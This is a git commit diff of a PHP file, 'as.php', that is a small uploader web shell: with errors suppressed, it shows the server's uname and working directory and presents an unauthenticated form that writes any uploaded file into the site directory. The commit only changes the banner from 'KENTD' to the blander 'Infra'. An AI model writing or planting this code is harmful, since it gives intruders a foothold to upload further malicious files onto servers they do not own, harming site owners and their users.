43f4fe80b20da727613ac8275d2a030a6ec7763e
hamidaso02 <69544220+hamidaso02@users.noreply.github.com>
2022-11-24 00:48:39 -0500

    Update as.php

--- as.php
+++ as.php
@@ -1,7 +1,7 @@
 <?php
 error_reporting(0);
 echo '<title>Infra</title>';
-echo '<center><b><h1>KENTD</h1>'.'<br>'.'[uname] '.php_uname().' [/uname] <br> Posisi : '.$cwd = getcwd(); Echo '<br><br><center><form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
+echo '<center><b><h1>Infra</h1>'.'<br>'.'[uname] '.php_uname().' [/uname] <br> Posisi : '.$cwd = getcwd(); Echo '<br><br><center><form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
 echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form></b>';
 if( $_POST['_upl'] == "Upload" ) {
 if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>SUKSES ! :)'; }
